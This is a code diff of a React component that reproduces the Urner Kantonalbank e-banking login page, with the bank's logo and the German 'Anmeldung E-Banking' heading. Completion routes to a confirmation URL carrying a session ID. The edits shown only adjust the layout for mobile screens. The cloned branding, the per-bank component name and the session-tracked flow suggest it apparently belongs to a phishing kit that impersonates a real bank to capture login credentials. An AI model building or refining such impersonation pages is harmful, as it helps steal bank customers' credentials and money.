@@ -90,16 +90,15 @@ const ChUrnerKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-white">
-        <main className="flex-1 px-4 py-8 md:py-14">
+      <div className="min-h-screen flex flex-col bg-[#f5f5f5] md:bg-white">
+        <main className="flex-1 px-0 py-0 md:px-4 md:py-14">
           <div className="w-full max-w-[1000px] mx-auto">
             {/* Main card */}
             <div
-              className="bg-white border border-[#e5e5e5] rounded-md overflow-hidden md:h-[715px] flex flex-col"
-              style={{ boxShadow: "0 1px 3px rgba(0,0,0,0.06)" }}
+              className="bg-white flex flex-col md:border md:border-[#e5e5e5] md:rounded-md md:overflow-hidden md:h-[715px] md:shadow-[0_1px_3px_rgba(0,0,0,0.06)]"
             >
               {/* Full-width card header */}
-              <div className="h-[40px] flex items-center px-6 bg-white shrink-0">
+              <div className="h-[40px] flex items-center px-4 md:px-6 bg-white shrink-0">
                 <img src={logoAsset.url} alt="Urner Kantonalbank" className="h-[26px]" />
               </div>
               {/* 50% yellow + 50% gray divider */}
@@ -109,9 +108,9 @@ const ChUrnerKantonalbank = () => {
               </div>
 
               {/* Content grid */}
-              <div className="grid md:grid-cols-2 flex-1 min-h-0">
+              <div className="flex flex-col md:grid md:grid-cols-2 md:flex-1 md:min-h-0">
                 {/* Login (left) */}
-                <div className="px-8 py-10 md:px-12 md:py-12 flex flex-col h-full">
+                <div className="px-6 py-8 md:px-12 md:py-12 flex flex-col md:h-full order-1 md:order-none">
                   <h1 className="text-[24px] font-semibold text-black mb-6">Anmeldung E-Banking</h1>
 
                   <div className="mb-5">
